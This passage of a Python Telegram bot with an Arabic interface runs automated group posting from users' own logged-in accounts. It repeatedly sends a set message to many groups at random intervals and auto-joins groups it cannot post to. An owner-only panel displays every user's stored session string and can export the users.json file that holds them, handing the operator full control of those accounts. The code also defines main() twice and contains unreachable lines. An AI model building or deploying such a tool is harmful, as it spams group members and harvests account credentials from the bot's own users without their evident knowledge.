        await client.start()

        while users[str(user_id)]["posting2"]:
            try:
                sleepTime = random.randint(250, users[str(user_id)]["waitTime"])
            except KeyError:
                users[str(user_id)]["waitTime"] = False
                write(users_db, users)
                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة وقت.", reply_markup=Markup([[Button("- إضافة وقت -", callback_data="waitTime")]]))

            groups = users[str(user_id)]["groups"]
            try:
                caption = users[str(user_id)]["caption2"]
            except KeyError:
                users[str(user_id)]["posting2"] = False
                write(users_db, users)
                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))

            for group in groups:
                if isinstance(group, str) and group.startswith("-"):
                    group = int(group)

                if not isinstance(group, int) or not str(group).startswith("-100"):
                    await app.send_message(int(user_id), f"Invalid group ID: {group}")
                    continue

                try:
                    await client.send_message(group, caption)
                except ChatWriteForbidden:
                    try:
                        await client.join_chat(group)
                        await client.send_message(group, caption)
                    except PeerIdInvalid:
                        await app.send_message(int(user_id), f"مشكلة في الانضمام للقروب : {group}")
                    except Exception as e:
                        await app.send_message(int(user_id), str(e))
                except PeerIdInvalid:
                    await app.send_message(int(user_id), f"مشكلة في القروب : {group}")
                except Exception as e:
                    await app.send_message(int(user_id), str(e))

            await sleep(sleepTime)

        await client.stop()

"""
USER SECTION ENDED
the next part for the bot's owner only


OWNER SECTION STARTED
"""
async def Owner(_, __: Client, message: Message):
    return message.from_user.id in owners

isOwner = filters.create(Owner)

adminMarkup = Markup([
    [
        Button("- الغاء VIP -", callback_data="cancelVIP"),
        Button("- تفعيل VIP -", callback_data="addVIP")
    ],
    [
        Button("- الاحصائيات -", callback_data="statics"),
        Button("- قنوات الإشتراك -", callback_data="channels")
    ],
    [
        Button("- الجلسات التي بالبوت -", callback_data="viewsession"),
        Button("- إرسال إذاعة -", callback_data="broadcast")
    ],
    [
        Button("- حالة الأعضاء -", callback_data="viewUsers"),
        Button("- الكلايش -", callback_data="viewcaption")
    ],
    [
        Button("- جلب التخزين -", callback_data="sendFiles")
    ],
])


@app.on_message(filters.command("admin") & filters.private & isOwner)
@app.on_callback_query(filters.regex("toAdmin") & isOwner)
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    fname = message.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
    func = message.reply if isinstance(message, Message) else message.message.edit_text
    await func(
        caption, 
        reply_markup=adminMarkup,
    )
    
@app.on_callback_query(filters.regex("sendFiles") & isOwner)
async def send_files(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
    ]])
    
    await callback.message.delete()
    
    # إرسال ملف users.json
    if os.path.exists(users_db):
        await app.send_document(chat_id=user_id, document=users_db, caption="Here is the users.json file.")
    else:
        await app.send_message(chat_id=user_id, text="The users.json file does not exist.")
    
    # إرسال ملف channels.json
    if os.path.exists(channels_db):
        await app.send_document(chat_id=user_id, document=channels_db, caption="Here is the channels.json file.")
    else:
        await app.send_message(chat_id=user_id, text="The channels.json file does not exist.")
    
    await callback.message.reply("تم إرسال الملفات بنجاح.", reply_markup=reMarkup)


@app.on_callback_query(filters.regex("broadcast") & isOwner)
async def broadcast(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
    ]])
    await callback.message.delete()
    
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- ارسل الرسالة التي تريد إذاعتها لجميع المستخدمين:",
            reply_markup=ForceReply(selective=True, placeholder="- اكتب رسالتك هنا:"),
            timeout=30
        )
    except TimeoutError:
        return await callback.message.reply("- نفذ وقت استلام الرسالة.", reply_markup=reMarkup)
    
    message_text = ask.text
    for user_id in users:
        try:
            await app.send_message(chat_id=user_id, text=message_text)
        except Exception as e:
            print(f"فشل في إرسال الرسالة إلى المستخدم {user_id}: {e}")
    
    await ask.reply("- تم إرسال الرسالة لجميع المستخدمين بنجاح.", reply_markup=reMarkup, reply_to_message_id=ask.id)


@app.on_callback_query(filters.regex(r"^(viewUsers)$") & isOwner)
async def viewUsers(_: Client, callback: CallbackQuery):
    user_status = ""
    for user_id, details in users.items():
        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\nوضع الـvip: {'مفعل' if details.get('vip') else 'معطل'}\n"
        if 'limitation' in details:
            user_status += f"موضوع الوقت : {details['limitation']['startDate']}\nينتهي بتاريخ : {details['limitation']['endDate']}\nالساعة : {details['limitation']['endTime']}\n"
        user_status += "\n"
    
    reMarkup = Markup([
        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])
    
    await callback.message.edit_text(
        f"حالة الأعضاء:\n\n{user_status}",
        reply_markup=reMarkup,
    )
@app.on_callback_query(filters.regex("viewcaption") & isOwner)
async def viewcaption(_: Client, callback: CallbackQuery):
    user_status = ""
    for user_id, details in users.items():
        caption = details.get("caption", "- لا يوجد كلايش يتم نشرها")
        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\n"
        if 'limitation' in details:
            user_status += f"الكليشة : {caption}\n"
        user_status += "\n"

    reMarkup = Markup([
        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])

    await callback.message.edit_text(
        f"حالة الأعضاء:\n\n{user_status}",
        reply_markup=reMarkup,
    )


@app.on_callback_query(filters.regex("viewsession") & isOwner)
async def viewsession(_: Client, callback: CallbackQuery):
    user_status = ""
    for user_id, details in users.items():
        sess = details.get("session", "- لا يوجد جلسات")
        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\n"
        if 'limitation' in details:
            user_status += f"الجلسة : {sess}\n"
        user_status += "\n"

    reMarkup = Markup([
        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])

    await callback.message.edit_text(
        f"حالة الأعضاء:\n\n{user_status}",
        reply_markup=reMarkup,
    )

@app.on_callback_query(filters.regex("addVIP") & isOwner)
async def addVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id 
    reMarkup = Markup([[
        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
    ]])
    await callback.message.delete()
    try: ask = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- ارسل ايدي المستخدم ليتم تفعيل VIP له",
        reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
        timeout = 30
    )
    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
    try: await app.get_chat(int(ask.text))
    except ValueError: return await ask.reply("- هذا البيانات لا يمكن ان تكون ايدي مستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    except: return await ask.reply("- لم يتم ايجاد هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    try: limit = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- أرسل الآن عدد الأيام المتاحه للعضو.\n\n- ارسل /cancel لإلغاء العمليه.",
        reply_markup = ForceReply(selective = True, placeholder = "- Days limitation: "),
        reply_to_message_id = ask.id,
        timeout = 30
    )
    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام عدد الايام المتاحه للمستخدم.")
    _id = int(ask.text)
    try:_limit = int(limit.text)
    except ValueError: return await callback.message.reply("- قيمة المده المتاحه للعضو غير صحيحه.", reply_to_message_id=limit.id, reply_markup=reMarkup)
    vipDate = timeCalc(_limit)
    users[str(_id)] = {"vip": True}
    users[str(_id)]["limitation"] = {
        "days": _limit,
        "startDate": vipDate["current_date"],
        "endDate": vipDate["end_date"],
        "endTime": vipDate["endTime"],
    }
    write(users_db, users)
    create_task(vipCanceler(_id))
    caption = f"- تم تفعيل اشتراك VIP جديد\n\n- معلومات الاشتراك:\n- تاريخ البدأ {vipDate['current_date']}\n- تاريخ انتهاء الاشتراك: {vipDate['end_date']}"
    caption += f"\n\n- المده بالأيام : {_limit} من الأيام\n- المده بالساعات: {vipDate['hours']} من الساعات\n- المده بالدقائق: {vipDate['minutes']} من الدقائق"
    caption += f"\n\n- وقت انتهاء الاشتراك : {vipDate['endTime']}"
    await limit.reply(
        caption,
        reply_markup = reMarkup, 
        reply_to_message_id = limit.id
    )
    try: await app.send_message(
        chat_id = _id,
        text = "- تم تفعيل VIP لك في بوت النشر التلقائي" + caption.split("جديد", 1)[1]
    )
    except: await limit.reply("- اجعل المستخدم يقوم بمراسلة البوت.")


@app.on_callback_query(filters.regex(r"^(cancelVIP)$") & isOwner)
async def cancelVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id 
    reMarkup = Markup([[
        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
    ]])
    await callback.message.delete()
    try: ask = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- ارسل ايدي المستخدم ليتم الغاء VIP الخاص به",
        reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
        timeout = 30
    )
    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
    if users.get(ask.text) is None: return await ask.reply("- هذا المستخدم غير موجود في تخزين البوت.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    elif not users[ask.text]["vip"]: return await ask.reply("- هذا المستخدم ليس من مستخدمي VIP.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    else:
        users[ask.text]["vip"] = False
        write(users_db, users)
        await ask.reply("- تم الغاء اشتراك هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)


@app.on_callback_query(filters.regex(r"^(channels)$") & isOwner)
async def channelsControl(_: Client, callback: CallbackQuery):
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button(channel, url=channel + ".t.me"),
            Button("🗑", callback_data=f"removeChannel {channel}")
        ] for channel in channels
    ]
    markup.extend([
        [Button("- إضافة قناه جديده -", callback_data="addChannel")],
        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
        ])
    await callback.message.edit_text(
        caption,
        reply_markup = Markup(markup) 
    )

@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwner)
async def addChannel(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id 
    reMarkup = Markup([[
        Button("- العوده للقنوات -", callback_data="channels")
    ]])
    await callback.message.delete()
    try: ask = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- ارسل معرف القناه دون @.",
        reply_markup = ForceReply(selective = True, placeholder = "- channel username: "),
        timeout = 30
    )
    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
    try: await app.get_chat(ask.text)
    except: return await callback.message.reply("- لم يتم ايجاد هذه الدردشه.")
    channel = ask.text
    channels.append(channel)
    write(channels_db, channels)
    await ask.reply("- تم إضافة القناه الى القائمه.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    
@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwner)
async def removeChannel(_: Client, callback: CallbackQuery):
    channel = callback.data.split()[1]
    if channel not in channels: await callback.answer("- هذه القناه غير موجوده بالفعل.")
    else:
        channels.remove(channel)
        write(channels_db, channels)
        await callback.answer("- تم حذف هذه القناه")
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button(channel, url=channel + ".t.me"),
            Button("🗑", callback_data=f"removeChannel {channel}")
        ] for channel in channels
    ]
    markup.extend([
        [Button("- إضافة قناه جديده -", callback_data="addChannel")],
        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
        ])
    await callback.message.edit_text(
        caption,
        reply_markup = Markup(markup) 
    )
    

@app.on_callback_query(filters.regex(f"^(statics)$") & isOwner)
async def statics(_: Client, callback: CallbackQuery):
    total = len(users)
    vip = 0
    for user in users:
        if users[user]["vip"]: vip += 1 
        else: continue
    reMarkup = Markup([
        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])
    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
    await callback.message.edit_text(
        caption, 
        reply_markup = reMarkup 
    )

_timezone = timezone("Asia/Baghdad")

def timeCalc(limit):
    start_date = datetime.now(_timezone)
    end_date = start_date + timedelta(days=limit)
    hours = limit * 24
    minutes = hours * 60
    return {
        "current_date": start_date.strftime("%Y-%m-%d"),
        "end_date": end_date.strftime("%Y-%m-%d"),
        "endTime": end_date.strftime("%H:%M"),
        "hours": hours,
        "minutes": minutes
    }
    users[str(_id)] = {"vip": False}


async def vipCanceler(user_id):
    await sleep(60)
    current_day = datetime.now(_timezone)
    cdate = current_day.strftime("%Y-%m-%d %H:%M")
    while True:
        print()
        if users[str(user_id)]["vip"] == False: break
        elif cdate != (users[str(user_id)]["limitation"]["endDate"] + " " + users[str(user_id)]["limitation"]["endTime"]):
            current_day = datetime.now(_timezone)
            cdate = current_day.strftime("%Y-%m-%d %H:%M") 
        else:
            break
        await sleep(20)
    users[str(user_id)] = {"vip": False}
    users[str(user_id)]["limitation"] = {}
    write(users_db, users)
    await app.send_message(
        user_id,
        "- انتهى اشتراك VIP الخاص بك.\n- راسل المطور اذا كنت تريد تجديد اشتراكك."
    )
"""
OWNER SECTION ENDED
the next part for the bot's setting and storage
"""

async def subscription(message: Message):
    user_id = message.from_user.id
    for channel in channels:
        try: await app.get_chat_member(channel, user_id)
        except UserNotParticipant: return channel
    return True


def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)


def read(fp):
    if not os.path.exists(fp):
        write(fp, {} if fp not in [channels_db] else [])
    with open(fp) as file:
        data = json.load(file)
    return data


users_db = "users.json"
channels_db = "channels.json"
users = read(users_db)
channels = read(channels_db)


async def reStartPosting():
    await sleep(444)
    for user in users:
        if users[user].get("posting"): create_task(posting(user))

async def reStartPosting2():
    await sleep(444)
    for user in users:
        if users[user].get("posting2"): create_task(posting2(user))

async def reVipTime():
    for user in users:
        if int(user) == owner: continue
        if users[user]["vip"]: create_task(vipCanceler(int(user)))


async def main():
    create_task(reStartPosting())
    create_task(reVipTime())
    await app.start()
    await idle()

async def main():
    create_task(reStartPosting2())
    create_task(reVipTime())
    await app.start()
    await idle()

if __name__=="__main__":
    loop.run_until_complete(main())
